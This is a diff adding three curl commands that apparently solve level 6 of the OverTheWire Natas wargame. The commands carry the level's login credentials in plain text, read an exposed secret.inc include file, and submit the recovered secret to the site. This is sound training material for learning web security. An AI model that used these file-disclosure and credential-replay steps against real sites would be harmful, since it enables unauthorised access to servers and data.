@@ -1,0 +1,3 @@
+curl -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org
+curl -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc
+curl -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 --data secret=FOEIUWGHFEEUHOFUOIU&submit=Submit+Query http://natas6.natas.labs.overthewire.org
